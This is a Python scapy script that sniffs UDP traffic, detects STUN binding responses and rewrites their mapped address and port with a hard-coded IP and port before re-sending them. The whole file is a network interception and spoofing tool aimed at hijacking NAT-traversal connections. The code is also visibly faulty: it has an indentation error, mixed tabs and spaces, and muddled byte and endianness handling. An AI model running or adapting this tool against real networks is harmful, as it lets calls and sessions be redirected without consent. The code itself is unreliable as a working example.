#!/usr/local/bin/python3.8
from scapy.all import *
import struct
from IPy import IP

class STUN(Packet):
	name = "STUN Packet"
		fields_desc = [XByteField("Message Type", '\x01\x01'),
		]

def hexStrEndianSwap(theString):
	if len(theString)%2 != 0:
    		return -1
	
	swapList = []
	for i in range(0, len(theString), 2):
    		swapList.insert(0, theString[i:i+2])

	return ''.join(swapList)

def xor_strings(xs, ys):
	return "".join(chr(x ^ ord(y)) for x, y in zip(xs, ys)) 


def replace_reflexive(packet):
	print("replacing ip...")
	pkt = packet
	pkt[0].load = bytearray(packet[0].load)
	ip_magic_cookie = pkt[0]['UDP'].load[4:8]
	ip = "\x49\x23\x9d\x38"
	host_order_ip = xor_strings(ip_magic_cookie, ip)
	net_order_ip = hexStrEndianSwap(host_order_ip)
	pkt[0]['UDP'].load[28:32] = net_order_ip

	print("replacing port...")
	port_magic_cookie = pkt[0]['UDP'].load[4:6]
	port = "\xc9\xfa"
	host_order_port = xor_strings(port_magic_cookie, port)
	net_order_port = hexStrEndianSwap(host_order_port)
	pkt[0]['UDP'].load[26:28] = net_order_port
	return pkt

def is_stun(pkt):
	try:
		if pkt[0]['UDP'].load[0:3] == b"\x01\x01\x00":
			return True
		else:
			return False
	except:
		pass

def intercept(packet):
	if is_stun(packet):
		new_pkt = replace_reflexive(packet)
		sr1(bytes(new_pkt))

sniff(filter='udp', prn=intercept)